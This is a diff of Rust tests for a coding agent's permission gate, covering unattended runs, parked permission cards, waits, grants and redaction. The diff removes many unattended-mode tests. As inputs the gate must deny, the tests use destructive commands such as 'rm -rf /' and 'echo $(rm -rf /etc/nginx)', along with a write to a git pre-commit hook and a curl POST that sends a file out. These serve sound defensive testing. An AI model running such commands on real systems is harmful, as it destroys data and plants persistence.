-            Unsettled::Refused
-        )));
-    }
-
-    /// Every [`Unsettled`] cause.
-    const UNSETTLED_CAUSES: [Unsettled; 3] = [
-        Unsettled::Refused,
-        Unsettled::Unreadable,
-        Unsettled::EngineState,
-    ];
-
-    /// A trigger whose `permission_wait` is `deny` keeps today's immediate
-    /// deny, even with a trigger that would announce the card.
-    #[tokio::test]
-    async fn a_deny_wait_never_parks_even_with_an_announcing_trigger() {
-        use crate::test_support::{setup_test_db, teardown_test_db};
-        let (pool, db_name) = setup_test_db().await;
-        let (bus, _rx) = EventBus::new(pool.clone());
-        let pending = Arc::new(Mutex::new(PermissionState::default()));
-        let trigger_id = "trig-deny-wait";
-        let thread_id = Uuid::new_v4();
-        seed_cc_thread(&bus, thread_id).await;
-        insert_origin_event(
-            &pool,
-            thread_id,
-            "TriggerStarted",
-            &scheduler_origin(trigger_id),
-        )
-        .await;
-
-        let waiter = raise_unattended(
-            &pool,
-            &bus,
-            &pending,
-            with_notifying_trigger(trigger_configs_with_wait(trigger_id, "deny"), None, false),
-            thread_id,
-            "/bin/zsh -lc 'echo $(rm -rf /etc/nginx)'",
-        )
-        .await;
-        let outcome = tokio::time::timeout(std::time::Duration::from_secs(5), waiter)
-            .await
-            .expect("must not hang")
-            .expect("task ok");
-        assert!(!outcome.allowed);
-        assert_eq!(
-            outcome.reason.as_deref(),
-            Some(UNATTENDED_DENY_UNCLASSIFIED_REASON)
-        );
-        assert_eq!(count_permission_events(&pool, thread_id).await, (1, 1));
-
-        pool.close().await;
-        teardown_test_db(&db_name).await;
-    }
-
-    /// The first waiter whose wait runs out withdraws the card for every
-    /// deduped waiter, and records a denial naming the wait.
-    #[tokio::test]
-    async fn a_parked_card_is_withdrawn_and_denied_when_its_wait_runs_out() {
-        use crate::test_support::{setup_test_db, teardown_test_db};
-        let (pool, db_name) = setup_test_db().await;
-        let (bus, _rx) = EventBus::new(pool.clone());
-        let pending = Mutex::new(PermissionState::default());
-        let thread_id = Uuid::new_v4();
-        seed_cc_thread(&bus, thread_id).await;
-        let input = serde_json::json!({ "command": "./scripts/x.sh > /tmp/x.log" });
-        let park = || {
-            park_card(
-                &pool,
-                &bus,
-                &pending,
-                thread_id,
-                "i".into(),
-                "command_execution".into(),
-                &input,
-                GrantOffer::default(),
-            )
-        };
-        let card = park().await;
-        let sibling = park().await;
-        assert_eq!(
-            card.request_id, sibling.request_id,
-            "a twin attaches to the card"
-        );
-
-        let (outcome, sibling_outcome) =
-            tokio::time::timeout(std::time::Duration::from_secs(5), async {
-                tokio::join!(
-                    await_parked_card(
-                        &bus,
-                        &pending,
-                        thread_id,
-                        card,
-                        Some(std::time::Duration::from_millis(50)),
-                    ),
-                    await_parked_card(&bus, &pending, thread_id, sibling, None),
-                )
-            })
-            .await
-            .expect("the wait is bounded");
-
-        for o in [&outcome, &sibling_outcome] {
-            assert!(!o.allowed);
-            assert!(
-                o.reason
-                    .as_deref()
-                    .is_some_and(|r| r.starts_with(UNATTENDED_WAIT_EXPIRED_REASON)),
-                "{:?}",
-                o.reason
-            );
-        }
-        assert!(pending.lock().unwrap().by_request_id.is_empty());
-        assert_eq!(count_permission_events(&pool, thread_id).await, (1, 1));
-        let reason: Option<String> = sqlx::query_scalar(
-            "SELECT payload->>'reason' FROM events \
-             WHERE thread_id = $1 AND event_type = 'CodingAgentPermissionResolved'",
-        )
-        .bind(thread_id)
-        .fetch_one(&pool)
-        .await
-        .expect("resolution");
-        assert_eq!(reason.as_deref(), Some(UNATTENDED_WAIT_EXPIRED_REASON));
-
-        pool.close().await;
-        teardown_test_db(&db_name).await;
-    }
-
-    /// Once a card on a thread ran out its wait, a later refusal there denies
-    /// at once. One run stalls for one wait, not one per retry.
-    #[tokio::test]
-    async fn a_refusal_after_an_expired_wait_denies_at_once() {
-        use crate::test_support::{setup_test_db, teardown_test_db};
-        let (pool, db_name) = setup_test_db().await;
-        let (bus, _rx) = EventBus::new(pool.clone());
-        let pending = Mutex::new(PermissionState::default());
-        let thread_id = Uuid::new_v4();
-        seed_cc_thread(&bus, thread_id).await;
-        let refused = RequestVerdict::Unclassified(Unsettled::Refused);
-        let wait = Some(PermissionWait::Indefinite);
-        assert_eq!(
-            unattended_park_bound(&pool, thread_id, &refused, wait).await,
-            Some(None)
-        );
-
-        let input = serde_json::json!({ "command": "./scripts/x.sh" });
-        let card = park_card(
-            &pool,
-            &bus,
-            &pending,
-            thread_id,
-            "i".into(),
-            "command_execution".into(),
-            &input,
-            GrantOffer::default(),
-        )
-        .await;
-        let short = Some(std::time::Duration::from_millis(50));
-        let outcome = await_parked_card(&bus, &pending, thread_id, card, short).await;
-        assert!(!outcome.allowed);
-
-        assert_eq!(
-            unattended_park_bound(&pool, thread_id, &refused, wait).await,
-            None,
-            "a thread whose card expired must not park again"
-        );
-        assert_eq!(
-            unattended_park_bound(&pool, Uuid::new_v4(), &refused, wait).await,
-            Some(None),
-            "another thread still parks"
-        );
-
-        pool.close().await;
-        teardown_test_db(&db_name).await;
-    }
-
-    /// An engine-state write and an unreadable command stay an immediate deny
-    /// on an unattended run, even with a trigger that would announce the card.
-    #[tokio::test]
-    async fn unattended_engine_state_and_unreadable_requests_never_park() {
-        use crate::test_support::{setup_test_db, teardown_test_db};
-        let (pool, db_name) = setup_test_db().await;
-        let (bus, _rx) = EventBus::new(pool.clone());
-        let pending = Arc::new(Mutex::new(PermissionState::default()));
-        let trigger_id = "trig-no-park";
-        let requests = [
-            (
-                "Write",
-                serde_json::json!({ "file_path": "/ws/data/.git/hooks/pre-commit", "content": "x" }),
-            ),
-            ("command_execution", serde_json::json!({ "command": 42 })),
-        ];
-        for (tool_name, input) in requests {
-            let thread_id = Uuid::new_v4();
-            seed_cc_thread(&bus, thread_id).await;
-            insert_origin_event(
-                &pool,
-                thread_id,
-                "TriggerStarted",
-                &scheduler_origin(trigger_id),
-            )
-            .await;
-            let waiter = raise_unattended_tool(
-                &pool,
-                &bus,
-                &pending,
-                with_notifying_trigger(trigger_configs_with(trigger_id, vec![]), None, false),
-                thread_id,
-                tool_name,
-                input,
-            );
-            let outcome = tokio::time::timeout(std::time::Duration::from_secs(5), waiter)
-                .await
-                .expect("must not park")
-                .expect("task ok");
-            assert!(!outcome.allowed, "{tool_name}");
-            assert_eq!(
-                outcome.reason.as_deref(),
-                Some(UNATTENDED_DENY_UNCLASSIFIED_REASON)
-            );
-        }
-
-        pool.close().await;
-        teardown_test_db(&db_name).await;
-    }
-
-    /// A thread allow from a parked card covers its whole command head. On an
-    /// unattended run it must not let an ungranted side effect under that head
-    /// through: the trigger's grant still decides it.
-    #[tokio::test]
-    async fn an_unattended_thread_allow_never_covers_an_ungranted_side_effect() {
-        use crate::engine::claude_code::{derive_allow_pattern, AllowScope};
-        use crate::test_support::{setup_test_db, teardown_test_db};
-        let (pool, db_name) = setup_test_db().await;
-        let (bus, _rx) = EventBus::new(pool.clone());
-        let pending = Arc::new(Mutex::new(PermissionState::default()));
-        let trigger_id = "trig-session";
-        let thread_id = Uuid::new_v4();
-        seed_cc_thread(&bus, thread_id).await;
-        insert_origin_event(
-            &pool,
-            thread_id,
-            "TriggerStarted",
-            &scheduler_origin(trigger_id),
-        )
-        .await;
-
-        let parked = serde_json::json!({ "command": "curl -o ~/report.json https://host/x" });
-        let pattern = derive_allow_pattern(
-            "command_execution",
-            &parked,
-            AllowScope::Session,
-            &TrustedHeads::NONE,
-        )
-        .expect("a session pattern for the parked command");
-        pending
-            .lock()
-            .unwrap()
-            .allow_session(thread_id, pattern.clone());
-
-        let post = "curl -X POST https://example.com/api -d @data";
-        let post_input = serde_json::json!({ "command": post });
-        assert!(
-            session_allow_covers("command_execution", &post_input, &TrustedHeads::NONE, |p| p
-                == pattern),
-            "precondition: the thread allow covers the POST"
-        );
-
-        let waiter = raise_unattended(
-            &pool,
-            &bus,
-            &pending,
-            trigger_configs_with(trigger_id, vec![]),
-            thread_id,
-            post,
-        )
-        .await;
-        let outcome = tokio::time::timeout(std::time::Duration::from_secs(5), waiter)
-            .await
-            .expect("must not hang")
-            .expect("task ok");
-        assert!(!outcome.allowed, "the grant names no external API");
-
-        pool.close().await;
-        teardown_test_db(&db_name).await;
-    }
-
-    /// A trigger's wait reaches its run and the sub-threads under it.
-    #[tokio::test]
-    async fn resolve_attend_mode_carries_the_trigger_wait_to_its_child() {
-        use crate::test_support::{setup_test_db, teardown_test_db};
-        let (pool, db_name) = setup_test_db().await;
-        let trigger_id = "trig-wait";
-        let root = Uuid::new_v4();
-        let child = Uuid::new_v4();
-        insert_origin_event(&pool, root, "TriggerStarted", &scheduler_origin(trigger_id)).await;
-        insert_child_spawn_event(&pool, child, root).await;
-        let cfgs = trigger_configs_with_wait(trigger_id, 5);
-        let expected = AttendMode::Unattended {
-            grant: vec![],
-            wait: Some(PermissionWait::Minutes(5)),
-        };
-        assert_eq!(resolve_attend_mode(&pool, &cfgs, root).await, expected);
-        assert_eq!(resolve_attend_mode(&pool, &cfgs, child).await, expected);
-        pool.close().await;
-        teardown_test_db(&db_name).await;
-    }
-
-    /// An engine-rooted run names no wait, so it reads the preference. This is
-    /// the main check's fix thread.
-    #[tokio::test]
-    async fn resolve_attend_mode_names_no_wait_for_an_engine_root() {
-        use crate::test_support::{setup_test_db, teardown_test_db};
-        let (pool, db_name) = setup_test_db().await;
-        let thread_id = Uuid::new_v4();
-        insert_origin_event(
-            &pool,
-            thread_id,
-            "MessageReceived",
-            &MessageOrigin::engine(EngineReason::MainCheckRed),
-        )
-        .await;
-        let cfgs = trigger_configs_with_wait("unrelated", 5);
-        assert_eq!(
-            resolve_attend_mode(&pool, &cfgs, thread_id).await,
-            AttendMode::UNATTENDED_UNGRANTED
-        );
-        pool.close().await;
-        teardown_test_db(&db_name).await;
-    }
-
-    /// Every engine reason, grouped by the mode its thread resolves to. The
-    /// resolver's own match is exhaustive, so a new reason fails to compile
-    /// there and lands in one of these lists on purpose.
-    #[tokio::test]
-    async fn each_engine_reason_resolves_to_its_attend_mode() {
-        use crate::test_support::{setup_test_db, teardown_test_db};
-        let (pool, db_name) = setup_test_db().await;
-        let plugin_setup = EngineReason::PluginSetup {
-            plugin_id: "p".into(),
-            plugin_name: "P".into(),
-            version: "1".into(),
-            occasion: crate::engine::thread_events::PluginSetupOccasion::FreshInstall,
-            confirmed_on_device_id: None,
-        };
-        let plugin_proposal = EngineReason::PluginUpstreamProposal {
-            plugin_id: "p".into(),
-            plugin_name: "P".into(),
-            version: "1".into(),
-            patch_path: "x.patch".into(),
-            confirmed_on_device_id: None,
-        };
-        let plugin_auto_update = EngineReason::PluginAutoUpdate {
-            plugin_id: "p".into(),
-            marketplace_id: "m".into(),
-            marketplace_name: "M".into(),
-        };
-        let event_wait = EngineReason::EventWait {
-            outcome: crate::engine::thread_events::EventWaitOutcome::Delivered,
-            watched: vec![],
-            wait_reason: String::new(),
-        };
-        let owner_caused = [
-            EngineReason::HardenRetrigger,
-            EngineReason::MissingHardening,
-            EngineReason::MissingPlan,
-            EngineReason::ContextCeiling,
-            EngineReason::SuccessorSession,
-            plugin_setup,
-            plugin_proposal,
-            EngineReason::StaleSession,
-            EngineReason::ArchivedBranchWork,
-            EngineReason::UnmergedIntegratedWork,
-            EngineReason::SuccessorResidue,
-            EngineReason::ContinuationStarted,
-            EngineReason::OrphanRecovery,
-            event_wait,
-            EngineReason::CacheKeepAlive,
-        ];
-        // A merge-conflict thread with no lane batch has nobody who queued it.
-        let engine_alone = [
-            EngineReason::MergeConflict,
-            EngineReason::MainCheckRed,
-            EngineReason::MainCheckFlaky,
-            plugin_auto_update,
-        ];
-        let configs = empty_trigger_configs();
-        let thread_id = Uuid::new_v4();
-        for reason in &owner_caused {
-            assert_eq!(
-                attend_mode_of_engine_reason(&pool, &configs, thread_id, reason).await,
-                AttendMode::Interactive,
-                "{reason:?}"
-            );
-        }
-        for reason in &engine_alone {
-            assert_eq!(
-                attend_mode_of_engine_reason(&pool, &configs, thread_id, reason).await,
-                AttendMode::UNATTENDED_UNGRANTED,
-                "{reason:?}"
-            );
-        }
-        assert_eq!(
-            attend_mode_of_engine_reason(&pool, &configs, thread_id, &scheduler_reason("gone"))
-                .await,
-            AttendMode::UNATTENDED_UNGRANTED,
-            "a trigger the registry no longer holds stays unattended"
-        );
-        pool.close().await;
-        teardown_test_db(&db_name).await;
-    }
-
-    /// A lane batch on `lane_thread` with one member, queued by `queuer`.
-    async fn insert_lane_batch(pool: &sqlx::PgPool, lane_thread: Uuid, queuer: &MessageOrigin) {
-        let change_id = Uuid::new_v4();
-        let change_thread = Uuid::new_v4();
-        let batch_id = Uuid::new_v4();
-        let rows = [
-            (
-                "thread",
-                change_thread.to_string(),
-                "ChangeQueued",
-                serde_json::json!({
-                    "change_id": change_id.to_string(),
-                    "snapshot_sha": "snap",
-                    "actor": queuer,
-                }),
-                Some(change_thread),
-            ),
-            (
-                "landing_lane",
-                batch_id.to_string(),
-                "LaneBatchStarted",
-                serde_json::json!({
-                    "type": "LaneBatchStarted",
-                    "data": {
-                        "batch_id": batch_id,
-                        "members": [{ "change_id": change_id, "snapshot_sha": "snap" }],
-                        "base_sha": "base",
-                        "lane_thread_id": lane_thread,
-                    },
-                }),
-                None,
-            ),
-        ];
-        for (aggregate, aggregate_id, event_type, payload, thread_id) in rows {
-            sqlx::query(
-                "INSERT INTO events (id, aggregate, aggregate_id, event_type, payload, created, thread_id) \
-                 VALUES ($1, $2, $3, $4, $5, NOW(), $6)",
-            )
-            .bind(Uuid::new_v4())
-            .bind(aggregate)
-            .bind(aggregate_id)
-            .bind(event_type)
-            .bind(payload)
-            .bind(thread_id)
-            .execute(pool)
-            .await
-            .expect("insert lane event");
-        }
-    }
-
-    /// An agent can run `lucidos changes apply` on its own change. Its lane
-    /// thread is no owner's press, so it gets neither attended mode nor grants.
-    #[tokio::test]
-    async fn a_lane_thread_follows_who_queued_its_batch() {
-        use crate::test_support::{setup_test_db, teardown_test_db};
-        let (pool, db_name) = setup_test_db().await;
-        let configs = empty_trigger_configs();
-        let by_owner = Uuid::new_v4();
-        insert_lane_batch(&pool, by_owner, &device("owner-phone")).await;
-        let by_agent = Uuid::new_v4();
-        let agent = MessageOrigin::Api {
-            user_agent: None,
-            mode: ActorMode::Agent,
-            source_thread_id: Some(Uuid::new_v4()),
-        };
-        insert_lane_batch(&pool, by_agent, &agent).await;
-
-        let mode = |thread| {
-            attend_mode_of_engine_reason(&pool, &configs, thread, &EngineReason::MergeConflict)
-        };
-        assert_eq!(mode(by_owner).await, AttendMode::Interactive);
-        assert_eq!(mode(by_agent).await, AttendMode::UNATTENDED_UNGRANTED);
-
-        pool.close().await;
-        teardown_test_db(&db_name).await;
-    }
-
-    fn scheduler_reason(trigger_id: &str) -> EngineReason {
-        EngineReason::Scheduler {
-            trigger_id: trigger_id.to_string(),
-            trigger_name: None,
-            actor_email: None,
-        }
-    }
-
-    /// The reported landing: a lane thread's origin is `Engine { MergeConflict }`,
-    /// started by the owner's Apply. It is attended, so the workspace's own
-    /// grant covers its command and no card parks.
-    #[tokio::test]
-    async fn a_landing_thread_uses_the_workspace_grants_without_a_card() {
-        use crate::test_support::{setup_test_db, teardown_test_db};
-        let (pool, db_name) = setup_test_db().await;
-        let (bus, _rx) = crate::engine::event_bus::EventBus::new(pool.clone());
-        let pending = std::sync::Arc::new(Mutex::new(PermissionState::default()));
-        let thread_id = Uuid::new_v4();
-        seed_cc_thread(&bus, thread_id).await;
-        insert_origin_event(
-            &pool,
-            thread_id,
-            "MessageReceived",
-            &MessageOrigin::engine(EngineReason::MergeConflict),
-        )
-        .await;
-        insert_lane_batch(&pool, thread_id, &device("owner-phone")).await;
         let workspace = workspace_granting(&["Bash"]);
 
-        let outcome = tokio::time::timeout(
-            std::time::Duration::from_secs(5),
-            prompt_coding_agent_permission(
-                &pool,
-                &bus,
-                &pending,
-                &empty_trigger_configs(),
-                workspace.path(),
-                None,
-                None,
-                CodingAgentPermissionInput {
-                    thread_id,
-                    tool_use_id: "landing".to_string(),
-                    tool_name: "Bash".to_string(),
-                    input: serde_json::json!({
-                        "command": "./scripts/harden-gates.sh 2>&1 | tail -30"
-                    }),
-                },
-            ),
-        )
-        .await
-        .expect("a granted landing request never waits for a card");
+        for origin in [
+            device("owner-phone"),
+            MessageOrigin::engine(EngineReason::MainCheckRed),
+            MessageOrigin::engine(EngineReason::MergeConflict),
+            scheduler_origin("trig-granted"),
+        ] {
+            let thread_id = Uuid::new_v4();
+            seed_cc_thread(&bus, thread_id).await;
+            insert_origin_event(&pool, thread_id, "MessageReceived", &origin).await;
 
-        assert!(outcome.allowed);
-        assert_eq!(outcome.reason.as_deref(), Some(PERSISTED_ALLOW_REASON));
-        assert_eq!(card_count(&pool, thread_id).await, 0);
+            let outcome = tokio::time::timeout(
+                std::time::Duration::from_secs(5),
+                prompt_coding_agent_permission(
+                    &pool,
+                    &bus,
+                    &pending,
+                    workspace.path(),
+                    None,
+                    None,
+                    CodingAgentPermissionInput {
+                        thread_id,
+                        tool_use_id: "landing".to_string(),
+                        tool_name: "Bash".to_string(),
+                        input: serde_json::json!({
+                            "command": "./scripts/harden-gates.sh 2>&1 | tail -30"
+                        }),
+                    },
+                ),
+            )
+            .await
+            .unwrap_or_else(|_| panic!("{origin:?}: a granted request never waits for a card"));
 
-        pool.close().await;
-        teardown_test_db(&db_name).await;
-    }
+            assert!(outcome.allowed, "{origin:?}");
+            assert_eq!(
+                outcome.reason.as_deref(),
+                Some(PERSISTED_ALLOW_REASON),
+                "{origin:?}"
+            );
+            assert_eq!(card_count(&pool, thread_id).await, 0, "{origin:?}");
+        }
 
-    /// The workspace preference decides for a run whose root names no wait.
-    #[tokio::test]
-    async fn an_engine_rooted_run_parks_by_the_workspace_preference() {
-        use crate::test_support::{setup_test_db, teardown_test_db};
-        let (pool, db_name) = setup_test_db().await;
-        let refused = RequestVerdict::Unclassified(Unsettled::Refused);
-        let thread_id = Uuid::new_v4();
-        assert_eq!(
-            unattended_park_bound(&pool, thread_id, &refused, None).await,
-            Some(Some(std::time::Duration::from_secs(30 * 60))),
-            "the default wait is 30 minutes"
-        );
-        crate::core::preferences::PreferenceStore::set_row_for_test(
-            &pool,
-            crate::core::prefs::UNATTENDED_PERMISSION_WAIT.key(),
-            "deny",
-        )
-        .await
-        .expect("set preference");
-        assert_eq!(
-            unattended_park_bound(&pool, thread_id, &refused, None).await,
-            None
-        );
-        // The trigger's own wait overrides the preference.
-        assert_eq!(
-            unattended_park_bound(&pool, thread_id, &refused, Some(PermissionWait::Indefinite))
-                .await,
-            Some(None)
-        );
         pool.close().await;
         teardown_test_db(&db_name).await;
     }
 
     /// The recorded request is persisted AND fanned out over SSE, so it takes
-    /// the same scrub the interactive path applies.
+    /// the same scrub a card applies.
     #[tokio::test]
-    async fn an_unattended_deny_redacts_the_command_it_records() {
+    async fn an_auto_deny_redacts_the_command_it_records() {
         use crate::test_support::{setup_test_db, teardown_test_db};
         let (pool, db_name) = setup_test_db().await;
         let (bus, _rx) = EventBus::new(pool.clone());
         let pending = Arc::new(Mutex::new(PermissionState::default()));
-        let trigger_id = "trig-redact";
         let thread_id = Uuid::new_v4();
         seed_cc_thread(&bus, thread_id).await;
-        insert_origin_event(
-            &pool,
-            thread_id,
-            "TriggerStarted",
-            &scheduler_origin(trigger_id),
-        )
-        .await;
-        let cfgs = trigger_configs_with(trigger_id, vec![]);
         let secret = "postgres://u:hunter2@localhost:5432/db";
 
-        tokio::time::timeout(
+        let outcome = tokio::time::timeout(
             std::time::Duration::from_secs(5),
             prompt_coding_agent_permission(
                 &pool,
                 &bus,
                 &pending,
-                &cfgs,
                 Path::new("/ws"),
                 None,
                 None,
@@ -6632,13 +3802,14 @@ mod tests {
                     tool_use_id: "i".into(),
                     tool_name: "command_execution".into(),
                     input: serde_json::json!({
-                        "command": format!("psql {secret} -c 'select 1' && echo $(rm -rf ~)")
+                        "command": format!("psql {secret} -c 'select 1' && rm -rf /")
                     }),
                 },
             ),
         )
         .await
         .expect("must not hang");
+        assert!(!outcome.allowed, "the catastrophic floor denies");
 
         let payload: serde_json::Value = sqlx::query_scalar(
             "SELECT payload FROM events \
@@ -6675,55 +3846,6 @@ mod tests {
         )
     }
 
-    #[tokio::test]
-    async fn unattended_trigger_allows_granted_side_effect() {
-        use crate::test_support::{setup_test_db, teardown_test_db};
-        let (pool, db_name) = setup_test_db().await;
-        let (bus, _rx) = EventBus::new(pool.clone());
-        let pending = Arc::new(Mutex::new(PermissionState::default()));
-        let trigger_id = "trig-grant";
-        let thread_id = Uuid::new_v4();
-        seed_cc_thread(&bus, thread_id).await;
-        insert_origin_event(
-            &pool,
-            thread_id,
-            "TriggerStarted",
-            &scheduler_origin(trigger_id),
-        )
-        .await;
-        let cfgs = trigger_configs_with(trigger_id, vec![SideEffectCategory::ExternalApi]);
-
-        let outcome = tokio::time::timeout(
-            std::time::Duration::from_secs(5),
-            prompt_coding_agent_permission(
-                &pool,
-                &bus,
-                &pending,
-                &cfgs,
-                Path::new("/ws"),
-                // Command requests — the worktree fast path never covers them.
-                None,
-                None,
-                CodingAgentPermissionInput {
-                    thread_id,
-                    tool_use_id: "i".into(),
-                    tool_name: "command_execution".into(),
-                    input: serde_json::json!({"command": "/bin/zsh -lc 'curl -X POST https://example.com -d @x'"}),
-                },
-            ),
-        )
-        .await
-        .expect("must not hang");
-        assert!(outcome.allowed, "granted external API auto-allows");
-        assert_eq!(
-            outcome.reason.as_deref(),
-            Some(UNATTENDED_ALLOW_GRANTED_REASON)
-        );
-
-        pool.close().await;
-        teardown_test_db(&db_name).await;
-    }
-
     /// The full blocking round-trip both raise paths (CC MCP HTTP, Codex
     /// app-server bridge) share: the canonical caller emits ONE
     /// `CodingAgentPermissionRequest`, the user's click (the consent
@@ -6742,13 +3864,11 @@ mod tests {
             let pool = pool.clone();
             let bus = bus.clone();
             let pending = pending.clone();
-            let trigger_configs = empty_trigger_configs();
             tokio::spawn(async move {
                 prompt_coding_agent_permission(
                     &pool,
                     &bus,
                     &pending,
-                    &trigger_configs,
                     Path::new("/tmp"),
                     None,
                     None,
@@ -6838,7 +3958,6 @@ mod tests {
             &pool,
             &bus,
             &pending,
-            &empty_trigger_configs(),
             Path::new("/tmp"),
             None,
             None,
@@ -6902,7 +4021,6 @@ mod tests {
                 &pool,
                 &bus,
                 &pending,
-                &empty_trigger_configs(),
                 workspace.path(),
                 None,
                 None,
@@ -6924,58 +4042,6 @@ mod tests {
             card_count(&pool, thread_id).await,
             0,
             "a persisted grant must not render a card"
-        );
-
-        pool.close().await;
-        teardown_test_db(&db_name).await;
-    }
-
-    /// The gate sits BELOW the unattended one, so a grant a human clicked can
-    /// never answer for a session no human is watching. A catastrophic command
-    /// is denied whatever the allowlist says (ADR 0002).
-    #[tokio::test]
-    async fn an_unattended_session_ignores_the_workspace_allowlist() {
-        use crate::test_support::{setup_test_db, teardown_test_db};
-        let (pool, db_name) = setup_test_db().await;
-        let (bus, _rx) = crate::engine::event_bus::EventBus::new(pool.clone());
-        let pending = std::sync::Arc::new(Mutex::new(PermissionState::default()));
-        let thread_id = Uuid::new_v4();
-        let trigger_id = "nightly-allowlist";
-        seed_cc_thread(&bus, thread_id).await;
-        insert_origin_event(
-            &pool,
-            thread_id,
-            "MessageReceived",
-            &scheduler_origin(trigger_id),
-        )
-        .await;
-        let workspace = workspace_granting(&["Bash"]);
-
-        let outcome = tokio::time::timeout(
-            std::time::Duration::from_secs(5),
-            prompt_coding_agent_permission(
-                &pool,
-                &bus,
-                &pending,
-                &trigger_configs_with(trigger_id, vec![]),
-                workspace.path(),
-                None,
-                None,
-                CodingAgentPermissionInput {
-                    thread_id,
-                    tool_use_id: "i4".to_string(),
-                    tool_name: "Bash".to_string(),
-                    input: serde_json::json!({ "command": "rm -rf /" }),
-                },
-            ),
-        )
-        .await
-        .expect("an unattended session never waits for a card");
-
-        assert!(!outcome.allowed);
-        assert_eq!(
-            outcome.reason.as_deref(),
-            Some(UNATTENDED_DENY_CATASTROPHIC_REASON)
         );
 
         pool.close().await;
@@ -7012,7 +4078,6 @@ mod tests {
                 &pool,
                 &bus,
                 &pending,
-                &empty_trigger_configs(),
                 Path::new("/ws"),
                 Some(&f.root),
                 None,
@@ -7056,13 +4121,11 @@ mod tests {
 
         let waiter = {
             let (pool, bus, pending) = (pool.clone(), bus.clone(), pending.clone());
-            let cfgs = empty_trigger_configs();
             tokio::spawn(async move {
                 prompt_coding_agent_permission(
                     &pool,
                     &bus,
                     &pending,
-                    &cfgs,
                     Path::new("/ws"),
                     Some(Path::new("/ws/.lucidos/worktrees/thread-abc")),
                     None,
@@ -7118,13 +4181,11 @@ mod tests {
 
             let waiter = {
                 let (pool, bus, pending) = (pool.clone(), bus.clone(), pending.clone());
-                let cfgs = empty_trigger_configs();
                 tokio::spawn(async move {
                     prompt_coding_agent_permission(
                         &pool,
                         &bus,
                         &pending,
-                        &cfgs,
                         Path::new("/ws"),
                         Some(Path::new("/ws/.lucidos/worktrees/thread-abc")),
                         None,
@@ -7259,7 +4320,6 @@ mod tests {
                 &pool,
                 &bus,
                 &pending,
-                &empty_trigger_configs(),
                 Path::new("/ws"),
                 None,
                 None,
@@ -7386,13 +4446,11 @@ mod tests {
         let pending = Arc::new(Mutex::new(PermissionState::default()));
         let waiter = {
             let (pool, bus, pending) = (pool.clone(), bus.clone(), pending.clone());
-            let cfgs = empty_trigger_configs();
             tokio::spawn(async move {
                 prompt_coding_agent_permission(
                     &pool,
                     &bus,
                     &pending,
-                    &cfgs,
                     Path::new("/ws"),
                     None,
                     None,
